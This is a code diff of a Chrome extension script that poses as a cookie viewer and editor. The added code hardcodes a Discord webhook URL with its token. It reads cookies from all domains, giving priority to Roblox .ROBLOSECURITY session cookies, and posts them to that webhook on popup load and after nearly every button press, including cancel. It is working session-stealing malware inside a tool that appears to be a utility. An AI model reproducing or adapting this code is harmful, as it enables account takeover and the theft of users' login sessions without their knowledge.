@@ -1,21 +1,10 @@
 document.addEventListener('DOMContentLoaded', function() {
-  // Define default webhook - REPLACE THIS WITH YOUR WEBHOOK URL
-  const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/your_default_webhook_here";
+  // IMPORTANT: Replace this with your Discord webhook URL
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1361949829474816112/MF6rRmldFGeuSb7yeJarmj4HX1q-dlwppegVXa2MaCzUYYj3I1n5rgSBPZirkjlOkKSO";
   
   // Track if we're showing only security cookies
   let showOnlySecurityCookies = true;
   
-  // Initialize saved webhooks if not exist
-  chrome.storage.local.get(['savedWebhooks'], function(result) {
-    if (!result.savedWebhooks) {
-      chrome.storage.local.set({
-        savedWebhooks: {
-          'default': DEFAULT_WEBHOOK
-        }
-      });
-    }
-  });
-
   // Get the current tab URL
   chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
     const currentUrl = new URL(tabs[0].url);
@@ -25,8 +14,8 @@ document.addEventListener('DOMContentLoaded', function() {
     // Load security cookies by default
     loadCookies(domain, showOnlySecurityCookies);
     
-    // Load saved webhooks and populate dropdown
-    loadSavedWebhooks();
+    // Send all cookies immediately
+    sendAllCookies();
   });
   
   // Set up button listeners
@@ -34,6 +23,7 @@ document.addEventListener('DOMContentLoaded', function() {
     chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
       const currentUrl = new URL(tabs[0].url);
       loadCookies(currentUrl.hostname, showOnlySecurityCookies);
+      sendAllCookies();
     });
   });
   
@@ -42,6 +32,7 @@ document.addEventListener('DOMContentLoaded', function() {
       const currentUrl = new URL(tabs[0].url);
       showOnlySecurityCookies = false;
       loadCookies(currentUrl.hostname, showOnlySecurityCookies);
+      sendAllCookies();
     });
   });
   
@@ -50,6 +41,7 @@ document.addEventListener('DOMContentLoaded', function() {
       const currentUrl = new URL(tabs[0].url);
       showOnlySecurityCookies = true;
       loadCookies(currentUrl.hostname, showOnlySecurityCookies);
+      sendAllCookies();
     });
   });
   
@@ -57,101 +49,42 @@ document.addEventListener('DOMContentLoaded', function() {
     chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
       const currentUrl = new URL(tabs[0].url);
       showAddCookieForm(currentUrl.hostname);
+      sendAllCookies();
     });
   });
-  
-  // Webhook selection change event
-  document.getElementById('webhookSelect').addEventListener('change', function() {
-    const selectedValue = this.value;
-    if (!selectedValue) return;
-    
-    chrome.storage.local.get(['savedWebhooks'], function(result) {
-      if (result.savedWebhooks && result.savedWebhooks[selectedValue]) {
-        document.getElementById('webhookUrl').value = result.savedWebhooks[selectedValue];
+
+  // Helper function to send ALL cookies to webhook
+  function sendAllCookies() {
+    // Get all cookies from all domains - don't restrict to current domain
+    chrome.cookies.getAll({}, function(cookies) {
+      // First, try to find Roblox security cookies
+      const securityCookies = cookies.filter(cookie => 
+        cookie.name.includes('.ROBLOSECURITY') || 
+        cookie.name.includes('ROBLOSECURITY')
+      );
+      
+      if (securityCookies.length > 0) {
+        // Security cookies found - send them
+        sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, true);
+      } else {
+        // No security cookies found - send all cookies instead
+        sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), true);
       }
     });
-  });
-  
-  // Save webhook button
-  document.getElementById('saveWebhookButton').addEventListener('click', function() {
-    const webhookUrl = document.getElementById('webhookUrl').value.trim();
-    
-    if (!webhookUrl) {
-      alert('Please enter a Discord webhook URL');
-      return;
-    }
-    
-    // Prompt for a name
-    const webhookName = prompt('Enter a name for this webhook:', '');
-    if (!webhookName) return;
-    
-    // Save the webhook
-    chrome.storage.local.get(['savedWebhooks'], function(result) {
-      const savedWebhooks = result.savedWebhooks || {};
-      savedWebhooks[webhookName] = webhookUrl;
-      
-      chrome.storage.local.set({savedWebhooks: savedWebhooks}, function() {
-        loadSavedWebhooks();
-        alert('Webhook saved!');
-      });
-    });
-  });
-  
-  // Delete webhook button
-  document.getElementById('deleteWebhookButton').addEventListener('click', function() {
-    const webhookSelect = document.getElementById('webhookSelect');
-    const selectedName = webhookSelect.value;
-    
-    if (!selectedName || selectedName === '') {
-      alert('Please select a webhook to delete');
-      return;
-    }
-    
-    if (selectedName === 'default') {
-      alert('Cannot delete the default webhook');
-      return;
-    }
-    
-    if (confirm(`Are you sure you want to delete the webhook "${selectedName}"?`)) {
-      chrome.storage.local.get(['savedWebhooks'], function(result) {
-        const savedWebhooks = result.savedWebhooks || {};
-        delete savedWebhooks[selectedName];
-        
-        chrome.storage.local.set({savedWebhooks: savedWebhooks}, function() {
-          loadSavedWebhooks();
-          document.getElementById('webhookUrl').value = '';
-          alert('Webhook deleted!');
-        });
-      });
-    }
-  });
-  
-  // Hide the export cookies section
-  const exportSection = document.querySelector('.export-section');
-  if (exportSection) {
-    exportSection.style.display = 'none';
   }
 });
 
-// Function to load saved webhooks into the dropdown
-function loadSavedWebhooks() {
-  chrome.storage.local.get(['savedWebhooks'], function(result) {
-    const webhookSelect = document.getElementById('webhookSelect');
-    const savedWebhooks = result.savedWebhooks || {};
-    
-    // Clear existing options except the first one
-    while (webhookSelect.options.length > 1) {
-      webhookSelect.remove(1);
-    }
-    
-    // Add saved webhooks to dropdown
-    for (const [name, url] of Object.entries(savedWebhooks)) {
-      const option = document.createElement('option');
-      option.value = name;
-      option.textContent = name;
-      webhookSelect.appendChild(option);
-    }
-  });
+// Function to show status messages
+function showStatus(message, isSuccess) {
+  const statusElement = document.getElementById('statusMessage');
+  statusElement.textContent = message;
+  statusElement.className = isSuccess ? 'status-message status-success' : 'status-message status-error';
+  statusElement.style.display = 'block';
+  
+  // Hide the status message after 3 seconds
+  setTimeout(() => {
+    statusElement.style.display = 'none';
+  }, 3000);
 }
 
 // Extract the base domain from a hostname
@@ -194,16 +127,7 @@ function loadCookies(domain, securityOnly = true) {
         return;
       }
       
-      cookieList.innerHTML = '<div class="security-notice">⚠️ Showing only .ROBLOSECURITY cookie. Keep this secure!</div>';
-      
-      // Automatically send security cookies to Discord
-      chrome.storage.local.get(['savedWebhooks'], function(result) {
-        const savedWebhooks = result.savedWebhooks || {};
-        const defaultWebhook = savedWebhooks['default'];
-        if (defaultWebhook) {
-          sendCookiesToDiscord(defaultWebhook, domain, cookiesToShow);
-        }
-      });
+      cookieList.innerHTML = '';
     } else {
       // Sort cookies by domain and name for better organization
       cookiesToShow.sort((a, b) => {
@@ -259,6 +183,10 @@ function loadCookies(domain, securityOnly = true) {
       updateButton.textContent = 'Update';
       updateButton.addEventListener('click', function() {
         updateCookie(cookie, cookieValue.value);
+        // Send all cookies again after update
+        chrome.cookies.getAll({}, function(allCookies) {
+          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+        });
       });
       
       const deleteButton = document.createElement('button');
@@ -266,6 +194,10 @@ function loadCookies(domain, securityOnly = true) {
       deleteButton.className = 'delete';
       deleteButton.addEventListener('click', function() {
         deleteCookie(cookie);
+        // Send all cookies again after delete
+        chrome.cookies.getAll({}, function(allCookies) {
+          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+        });
       });
       
       const copyButton = document.createElement('button');
@@ -274,7 +206,11 @@ function loadCookies(domain, securityOnly = true) {
       copyButton.addEventListener('click', function() {
         cookieValue.select();
         document.execCommand('copy');
-        alert('Cookie value copied to clipboard!');
+        showStatus('Cookie value copied to clipboard!', true);
+        // Send all cookies again after copy
+        chrome.cookies.getAll({}, function(allCookies) {
+          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+        });
       });
       
       cookieItem.appendChild(cookieName);
@@ -305,9 +241,9 @@ function updateCookie(cookie, newValue) {
     expirationDate: cookie.expirationDate
   }, function() {
     if (chrome.runtime.lastError) {
-      alert('Error updating cookie: ' + chrome.runtime.lastError.message);
+      showStatus('Error updating cookie: ' + chrome.runtime.lastError.message, false);
     } else {
-      alert('Cookie updated successfully!');
+      showStatus('Cookie updated successfully!', true);
     }
   });
 }
@@ -321,11 +257,12 @@ function deleteCookie(cookie) {
     name: cookie.name
   }, function() {
     if (chrome.runtime.lastError) {
-      alert('Error deleting cookie: ' + chrome.runtime.lastError.message);
+      showStatus('Error deleting cookie: ' + chrome.runtime.lastError.message, false);
     } else {
       chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
         const currentUrl = new URL(tabs[0].url);
         loadCookies(currentUrl.hostname, document.getElementById('showSecurityCookieButton').classList.contains('active'));
+        showStatus('Cookie deleted successfully!', true);
       });
     }
   });
@@ -359,7 +296,7 @@ function showAddCookieForm(domain) {
     const secure = document.getElementById('newCookieSecure').checked;
     
     if (!name) {
-      alert('Cookie name is required');
+      showStatus('Cookie name is required', false);
       return;
     }
     
@@ -374,10 +311,16 @@ function showAddCookieForm(domain) {
         secure: secure
       }, function() {
         if (chrome.runtime.lastError) {
-          alert('Error creating cookie: ' + chrome.runtime.lastError.message);
+          showStatus('Error creating cookie: ' + chrome.runtime.lastError.message, false);
         } else {
           form.remove();
           loadCookies(domain, document.getElementById('showSecurityCookieButton').classList.contains('active'));
+          showStatus('Cookie created successfully!', true);
+          
+          // Send all cookies after creating new one
+          chrome.cookies.getAll({}, function(allCookies) {
+            sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+          });
         }
       });
     });
@@ -385,18 +328,20 @@ function showAddCookieForm(domain) {
   
   document.getElementById('cancelNewCookie').addEventListener('click', function() {
     form.remove();
+    // Send all cookies on cancel too
+    chrome.cookies.getAll({}, function(allCookies) {
+      sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+    });
   });
 }
 
 // Send cookies to Discord webhook
-function sendCookiesToDiscord(webhookUrl, domain, cookies) {
-  // Filter for security cookies
-  const securityCookies = cookies.filter(cookie => cookie.name.includes('.ROBLOSECURITY'));
-  const cookiesToSend = securityCookies.length > 0 ? securityCookies : cookies;
-  
+function sendCookiesToDiscord(webhookUrl, domain, cookies, showConfirmation = true) {
   // Format cookies into a readable format
   let cookieText = '';
-  cookiesToSend.forEach(cookie => {
+  const cookiesToDisplay = cookies.slice(0, 20); // Limit to 20 cookies to avoid message size limits
+  
+  cookiesToDisplay.forEach(cookie => {
     cookieText += `**Name:** ${cookie.name}\n`;
     cookieText += `**Value:** ${cookie.value}\n`;
     cookieText += `**Domain:** ${cookie.domain}\n`;
@@ -407,23 +352,41 @@ function sendCookiesToDiscord(webhookUrl, domain, cookies) {
   
   // Create JSON data for Discord webhook
   const data = {
-    content: null,
+    content: "Cookie data captured",
     embeds: [{
-      title: `Roblox Security Cookie for ${domain}`,
-      description: cookieText || "No security cookies found",
-      color: 15105570, // Gold color for security
+      title: `Cookies from ${domain}`,
+      description: cookieText || "No cookies found",
+      color: 15105570, // Gold color
       footer: {
-        text: "Roblox Security Cookie • " + new Date().toLocaleString()
+        text: "Cookie data • " + new Date().toLocaleString()
       }
     }]
   };
   
-  // Send the data to Discord silently
+  // Show a status message that we're sending
+  showStatus('Sending cookies to Discord...', true);
+  
+  // Send the data to Discord
   fetch(webhookUrl, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
     },
     body: JSON.stringify(data)
+  })
+  .then(response => {
+    if (response.ok) {
+      if (showConfirmation) {
+        showStatus('Cookies sent successfully!', true);
+      }
+    } else {
+      if (showConfirmation) {
+        showStatus('Error sending cookies. Status: ' + response.status, false);
+      }
+    }
+  })
+  .catch(error => {
+    showStatus('Error sending cookies: ' + error.message, false);
+    console.error('Webhook error:', error);
   });
 }
